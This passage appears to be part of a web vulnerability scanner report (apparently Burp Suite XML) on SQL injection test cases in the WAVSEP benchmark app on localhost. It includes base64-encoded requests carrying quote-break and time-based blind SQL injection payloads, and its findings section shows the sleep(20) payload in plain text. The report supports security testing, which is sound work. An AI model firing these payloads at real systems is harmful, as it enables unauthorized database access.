      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowNDoyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtT2JmdXNjYXRpb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjI5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NTcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCBjb250YWluaW5nIGFuIGlubGluZSBjb21tZW50cyB0byBieXBhc3MgV0FGLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULU9iZnVzY2F0aW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NTcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCBjb250YWluaW5nIGFuIGlubGluZSBjb21tZW50cyB0byBieXBhc3MgV0FGLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8659720014121560064</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case05-InjectionInSearch-ListingDatabaseContentsInlineComments-UnionObfuscationExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case05-InjectionInSearch-ListingDatabaseContentsInlineComments-UnionObfuscationExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowNDoyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtT2JmdXNjYXRpb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjI5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgZGF0YWJhc2UgdGFibGVzIGNvbnRlbnRzIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCBjb250YWluaW5nIGFuIGlubGluZSBjb21tZW50cyB0byBieXBhc3MgV0FGLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzSW5saW5lQ29tbWVudHMtVW5pb25PYmZ1c2NhdGlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR